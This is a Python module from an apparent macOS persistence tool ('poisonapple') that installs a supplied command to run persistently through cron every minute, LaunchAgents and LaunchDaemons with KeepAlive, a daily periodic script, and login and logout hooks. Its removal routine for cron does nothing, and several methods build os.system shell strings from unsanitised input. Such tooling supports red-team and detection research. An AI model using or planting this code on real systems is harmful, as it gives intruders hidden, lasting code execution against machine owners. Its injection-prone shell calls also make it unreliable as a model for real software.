"""poisonapple.techniques"""

import os
import launchd

from crontab import CronTab
from poisonapple.util import print_error


class Technique:
    def __init__(self, technique, name, command, root_required=False):
        self.technique = technique
        self.name = name
        self.command = command
        self.root_required = root_required
        self.success = False
        self.error_message = str()

    def display_result(self):
        if self.success:
            print_error('success', text=self.technique)
        else:
            print_error('failure', text=self.technique)
            print_error('python_error', text=self.error_message)

    @staticmethod
    def execute(func):
        def wrapper(self):
            if self.root_required and not os.geteuid() == 0:
                self.error_message = 'Root access is required for this technique.'
            else:
                try:
                    func(self)
                    self.success = True
                except Exception as e:
                    self.error_message = str(e)
            self.display_result()
        return wrapper


def write_plist(label, program_arguments, scope):
    plist = dict(
        Label=label,
        ProgramArguments=program_arguments.split(),
        RunAtLoad=True,
        KeepAlive=True,
    )
    job = launchd.LaunchdJob(label)
    fname = launchd.plist.write(label, plist, scope=scope)
    launchd.load(fname)


def uninstall_plist(label, scopes):
    if launchd.LaunchdJob(label).exists():
        fname = launchd.plist.discover_filename(label, scopes=scopes)
        launchd.unload(fname)
        os.unlink(fname)


class LaunchAgent(Technique):
    def __init__(self, name, command):
        super().__init__('LaunchAgent', name, command, root_required=True)

    @Technique.execute
    def run(self):
        write_plist(self.name, self.command, 2)

    @Technique.execute
    def remove(self):
        uninstall_plist(self.name, 2)
        # os.remove(f'/Library/LaunchAgents/{self.name}.plist')


class LaunchDaemon(Technique):
    def __init__(self, name, command):
        super().__init__('LaunchDaemon', name, command, root_required=True)

    @Technique.execute
    def run(self):
        write_plist(self.name, self.command, 3)

    @Technique.execute
    def remove(self):
        uninstall_plist(self.name, 3)
        # os.remove(f'/Library/LaunchDaemons/{self.name}.plist')


class Cron(Technique):
    def __init__(self, name, command):
        super().__init__('Cron', name, command, root_required=False)

    @Technique.execute
    def run(self):
        cron = CronTab(user=os.getlogin())
        job = cron.new(command=self.command)
        job.minute.every(1)
        cron.write()

    @Technique.execute
    def remove(self):
        pass


class Periodic(Technique):
    def __init__(self, name, command):
        super().__init__('Periodic', name, command, root_required=True)

    @Technique.execute
    def run(self):
        periodic_path = f'/etc/periodic/daily/666.{self.name}'
        os.system(f'echo "#!/bin/sh" > {periodic_path}')
        os.system(f'echo {self.command} >> {periodic_path}')
        os.system(f'chmod 755 {periodic_path}')

    @Technique.execute
    def remove(self):
        os.remove(f'/etc/periodic/daily/666.{self.name}')


class LoginHook(Technique):
    def __init__(self, name, command):
        super().__init__('LoginHook', name, command, root_required=True)

    @Technique.execute
    def run(self):
        os.system(f'defaults write com.apple.loginwindow LoginHook "{self.command}"')

    @Technique.execute
    def remove(self):
        os.system('defaults delete com.apple.loginwindow LoginHook')


class LogoutHook(Technique):
    def __init__(self, name, command):
        super().__init__('LogoutHook', name, command, root_required=True)

    @Technique.execute
    def run(self):
        os.system(f'defaults write com.apple.loginwindow LogoutHook "{self.command}"')

    @Technique.execute
    def remove(self):
        os.system('defaults delete com.apple.loginwindow LogoutHook')


technique_list = [
    Cron,
    LaunchAgent,
    LaunchDaemon,
    LoginHook,
    LogoutHook,
    Periodic,
]